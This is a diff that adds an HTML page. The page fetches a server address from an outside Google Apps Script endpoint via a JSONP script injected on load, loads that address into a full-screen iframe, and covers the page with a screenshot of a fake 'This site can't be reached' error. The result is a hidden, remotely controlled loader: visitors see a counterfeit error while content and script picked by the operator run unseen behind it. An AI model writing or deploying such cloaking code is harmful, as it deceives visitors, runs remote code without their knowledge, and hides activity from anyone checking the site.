@@ -1,0 +1,74 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Embedded Website</title>
+
+    <style>
+        body {
+            margin: 0;
+            overflow: hidden;
+        }
+
+        iframe {
+            width: 100%;
+            height: 100vh;
+            border: none;
+        }
+
+        /* Top overlay image */
+        #overlay {
+            position: fixed;
+            inset: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: 9999;
+        }
+    </style>
+</head>
+
+<body>
+
+    <iframe id="serverFrame"></iframe>
+
+    <img
+        id="overlay"
+        src="https://static-kb.siteground.com/wp-content/uploads/sites/2/2023/04/this-site-cant-be-reached-error-1646x989.jpg"
+        alt=""
+    >
+
+    <script>
+        const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyes9137qQSpvybp2urqouAawrv1mJIvcLWynwuWEGvdEE0kZeagoIPCSH80VQ1M7bR/exec";
+
+        window.handleServerAddress = function(data) {
+            const address = data.server_address;
+
+            if (
+                address &&
+                (address.startsWith("http://") ||
+                 address.startsWith("https://"))
+            ) {
+                document.getElementById("serverFrame").src = address;
+            } else {
+                document.body.innerHTML = "No server address found.";
+            }
+        };
+
+        const script = document.createElement("script");
+
+        script.src =
+            GOOGLE_SCRIPT_URL +
+            "?callback=handleServerAddress";
+
+        script.onerror = function() {
+            document.body.innerHTML =
+                "Could not retrieve server address.";
+        };
+
+        document.body.appendChild(script);
+    </script>
+
+</body>
+</html>
